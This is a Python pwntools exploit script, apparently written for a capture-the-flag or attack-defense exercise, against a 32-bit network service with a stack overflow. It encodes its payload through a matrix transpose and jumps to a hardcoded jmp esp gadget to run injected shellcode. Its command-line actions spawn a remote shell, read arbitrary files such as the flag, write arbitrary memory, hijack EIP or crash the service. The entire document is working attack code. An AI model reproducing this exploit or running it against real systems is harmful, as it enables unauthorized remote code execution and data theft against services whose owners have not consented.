#! /usr/bin/python
# generate exp poll traffic, to show program vulnerability
import pwn
import argparse
import sys
import os
import json
import socket
import string
from struct import pack
import math
pwn.context.log_level = 'debug'
pwn.context.terminal = ['gnome-terminal','-x','bash','-c']

def z(a=''):
    pwn.gdb.attach(t,a)
    if a == '':
        raw_input()
def login():
    pay='asd\n'
    pay+='-65536\n'
    return pay

def numbers(n):
    return str(n)+'\n'

def convert(s):
    size = int(math.sqrt(len(s)))
    s = map(ord,list(s))

    for i in range(size):
        for j in range(i,size):
            tmp = s[i*size+j]
            s[i*size+j] = s[i+j*size]
            s[i+j*size] = tmp
    p=''
    for i in range(len(s)):
        p+=str(s[i])+'\n'
    
    return p


def make_payload(shellcode):
    jmp_esp=0x080e1e2b
    pay=''
    pay+=login()
    p = 'a'*0x24+'bbbb'+pwn.p32(jmp_esp)+shellcode
    l = (int(math.sqrt(len(p)))+1)**2
    p = p.ljust(l,'\x00')
    pay+=numbers(l)
    pay+=convert(p)
    return pay

def get_shell():
    sc = pwn.asm(pwn.shellcraft.i386.sh())
    return make_payload(sc)


def read_addr(addr):
    sc = pwn.asm(pwn.shellcraft.i386.write(1, addr, 4))
    return make_payload(sc)


def crash():
    payload = make_payload('asd')
    return payload

def write_addr(addr, value):
    shellcode = pwn.asm("mov eax, %d"%(addr))
    shellcode += pwn.asm("mov dword ptr [eax], %d"%(value))
    shellcode += 'aaaa'
    return make_payload(shellcode)


def hijack_eip(addr):
    shellcode = pwn.asm("push %d"%(addr))
    shellcode += pwn.asm("ret")
    return make_payload(shellcode)


def get_flag(path):
    sc = pwn.asm(pwn.shellcraft.i386.linux.readfile(path,dst=1))
    return make_payload(sc)

def setup_argparse():
    ''' parse arguments '''
    parser = argparse.ArgumentParser()
    parser.add_argument('action', choices=['shell', 'read', 'crash', 'write', 'normal', 'eip'],
                        help="the action you want to do")
    parser.add_argument('--host', default='127.0.0.1', help="the target ip address of server 127.0.0.1 by defaul")
    parser.add_argument('-p', '--port', type=int, default=80, help="the target port of server 80 by defual")
    parser.add_argument('--addr', type=str, help="the address to read,write or hijack eip address")
    parser.add_argument('--value', type=lambda x: int(x, 0), help="the value to write only use in write action")
    parser.add_argument('--local',
                        help="the path of the local binary file"
                             "if this is defined, the host and port will be ignore ")

    args = parser.parse_args()
    return args

if __name__ == "__main__":
    args = setup_argparse()
    if args.local is not None:
        t = pwn.process(args.local)
    else:
        t = pwn.remote(args.host, args.port)

    if args.action == "shell":
        payload = get_shell()
        t.sendline(payload)
        t.sendline('echo "do I get shell?"')
        t.recvuntil("do I get shell?\n")
        t.success("get shell")
        t.interactive()
    elif args.action == "read":
        payload = get_flag(args.addr)
        t.sendline(payload)
        t.success(t.recv())
        t.interactive()
    elif args.action == "crash":
        payload = crash()
        t.sendline(payload)
        t.recv()
    elif args.action == 'write':
        payload = write_addr(args.addr, args.value)
        t.sendline(payload)
        t.recv()
    elif args.action == 'eip':
        payload = hijack_eip(args.addr)
        t.sendline(payload)
        t.recv()
    elif args.action == "normal":
        t.sendline("aaa\r\n")
        t.recv()
